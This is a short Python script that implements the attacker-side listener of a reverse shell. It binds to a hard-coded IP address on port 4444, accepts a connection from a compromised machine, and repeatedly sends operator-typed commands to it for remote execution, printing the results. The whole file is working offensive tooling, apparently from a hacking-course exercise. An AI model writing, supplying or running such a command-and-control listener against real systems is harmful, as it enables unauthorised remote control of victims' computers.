import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # listener.bind(('10.38.1.110', 4444))
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections.')
        self.connection, address = listener.accept()
        print('[+] Got a connection from ' + str(address))


    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024).decode()
    
    def run(self):
        while True:
            command = input('>> ').encode()
            result = self.execute_remotely(command)
            print(result)
            
my_listener = Listener('10.38.1.110', 4444)
my_listener.run()